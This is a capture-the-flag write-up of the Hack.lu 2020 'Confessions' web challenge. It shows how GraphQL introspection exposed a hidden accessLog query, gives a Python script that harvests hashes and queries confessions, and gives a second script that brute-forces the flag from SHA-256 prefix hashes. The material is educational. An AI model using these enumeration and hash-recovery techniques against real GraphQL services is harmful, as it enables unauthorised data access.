---
title: "Hack.lu CTF 2020: Confessions"
tags: [CTF, web, python, scripting]
date: 2020-10-24
---


# Challenge
Prompt:

![png](/images/hacklu-writeups/confessions-prompt.png)

We are presented with a web page that let's us post confessions. Basically we can enter a title and a message, and the sha256 hash of the message is reflected on the page: 

![png](/images/hacklu-writeups/confessions-main-page.png)

Quick look at the source code reveals <i>confessions.js</i>. Let's have a look.

```
// talk to the GraphQL endpoint
const gql = async (query, variables={}) => {
    let response = await fetch('/graphql', {
        method: 'POST',
        headers: {
            'content-type': 'application/json',
        },
        body: JSON.stringify({
            operationName: null,
            query,
            variables,
        }),
    });
    let json = await response.json();
    if (json.errors && json.errors.length) {
        throw json.errors;
    } else {
        return json.data;
    }
};

// some queries/mutations
const getConfession = async hash => gql('query Q($hash: String) { confession(hash: $hash) { title, hash } }', { hash }).then(d => d.confession);
const getConfessionWithMessage = async id => gql('mutation Q($id: String) { confessionWithMessage(id: $id) { title, hash, message } }', { id }).then(d => d.confessionWithMessage);
const addConfession = async (title, message) => gql('mutation M($title: String, $message: String) { addConfession(title: $title, message: $message) { id } }', { title, message }).then(d => d.addConfession);
const previewHash = async (title, message) => gql('mutation M($title: String, $message: String) { addConfession(title: $title, message: $message) { hash } }', { title, message }).then(d => d.addConfession);

// the important elements
const title = document.querySelector('#title');
const message = document.querySelector('#message');
const publish = document.querySelector('#publish');
const preview = document.querySelector('#preview');

// render a confession
const show = async confession => {
    if (confession) {
        preview.querySelector('.title').textContent = confession.title || '<title>';
        preview.querySelector('.hash').textContent = confession.hash || '<hash>';
        preview.querySelector('.message').textContent = confession.message || '<message>';
        preview.querySelector('.how-to-verify').textContent = `sha256(${JSON.stringify(confession.message || '')})`;
    } else {
        preview.innerHTML = '<em>Not found :(</em>';
    }
};

// update the confession preview
const update = async () => {
    let { hash } = await previewHash(title.value, message.value);
    let confession = await getConfession(hash);
    await show({
        ...confession,
        message: message.value,
    });
};
title.oninput = update;
message.oninput = update;

// publish a confession
publish.onclick = async () => {
    title.disabled = true;
    message.disabled = true;
    publish.disabled = true;

    let { id } = await addConfession(title.value, message.value);
    location.href = `#${id}`;
    location.reload();
};

// show a confession when one is given in the location hash
if (location.hash) {
    let id = location.hash.slice(1);
    document.querySelector('#input').remove();
    getConfessionWithMessage(id).then(show).catch(() => document.write('F'));
}

```

## GraphQL Schema introspection
The above code reveals that GraphQL is used for storing and accessing confessions.
There is a query, <i>confession</i>, as well as two mutations, <i>confessionWithMessage</i> and <i>addConfession</i>.

I wanted to further enumerate the GraphQL schema and see if there is anything else accessible to us. I did not have much experience with GraphQL prior to this challenge so this was a great learning opportunity. 
I found this guide,[https://moonhighway.com/five-introspection-queries](https://moonhighway.com/five-introspection-queries) and used some of the queries to see what I can learn about the GraphQL schema for this challenge.

First, let's see if there are any other queries we can send:
![png](/images/hacklu-writeups/query-types.png)

The query <i>accessLog</i> sticks out like a sore thumb.
Let's try to send an accessLog query:

![png](/images/hacklu-writeups/access-log-query-response.png)

Looks like we're onto something here. We can see in the response a bunch of confessions and their hashes. The timestamps are not consistent with the time at which I was playing with the web app and sending my own trial 'confessions'.

I stripped out all of the hashes, and sent a <i>confession</i> query with each of the hashes passed as arguments. This is the response I received:

![png](/images/hacklu-writeups/confession-w-title.png)

Below is the script used to send <i>accessLog</i> query, strip out hashes, and send each one as an argument to a <i>confession</i> query.

```python
import requests
import json

session = requests.Session()

url = 'https://confessions.flu.xxx/graphql'

query = """
query Q{
    accessLog{
        name, timestamp, args
    }
}
"""

full_query = {
    'operationName': None,
    'query': query,
    'variables':{
        'hash':'827ade3254c72ae811201b418766d9a8802e91b029d95cc9de2f0169274aedd7'
    }
}
r = session.post(url, json=full_query)

response_json = json.loads(r.text)

print('Query: ')
print(query)
print('************************************************')

print('response: ')
print(json.dumps(response_json, indent=2))
print('************************************************')
print('------------------------------------------------')
print()

hashes = []
for i in response_json['data']['accessLog']:
    if 'hash' in i['args']:
        hashes.append(i['args'].split('":"')[1].split('"}')[0])

for h in hashes: print(h)



############################################################
# send each hash

query = """
query Q($hash: String){
    confession(hash: $hash){
        title, hash, id, message
    }
}
"""


for h in hashes:
    full_query = {
        'operationName': None,
        'query': query,
        'variables':{
            'hash':h
        }
    }

    r = session.post(url, json=full_query)

    response_json = json.loads(r.text)

    print('hash: ')
    print(h)
    print('************************************************')

    print('response: ')
    print(json.dumps(response_json, indent=2))
    print('************************************************')
    print('------------------------------------------------')
    print()
```

Each of these confessions had a title of <b>Flag</b>. But why are there so many?

I entered the first couple of hashes into [CrackStation](https://crackstation.net/).
The first hash was found to be <i>f</i>
Next one was <i>fl</i>
And the subsequent hashes started spelling out <i>flag{</i>

## Cracking the hashes by iteratively bruteforcing

I could not crack any more hashes on CrackStation, but now I could see a clear path to the flag:

* iterate through all ascii characters
* add this character to the already known flag, and calculate sha256 sum
* see if calculated hash is in the list of exposed hashes from accessLog query
* if it is, add that character to the running flag
* iterate until flag is complete

Below is my script that does this:

```python
import hashlib
import string


with open('hashes.txt') as f:
    h = f.read()

# get list of hashes from hashes.txt
hashes = h.split('\n')

flag = []

while len(flag) < 28:
    for c in string.printable:
        temp = ''.join(flag) + c
        hashed = hashlib.sha256(temp.encode()).hexdigest()
        if hashed in hashes:
            flag.append(c)
            print(''.join(flag))
```


## Flag
![png](/images/hacklu-writeups/flag.png)
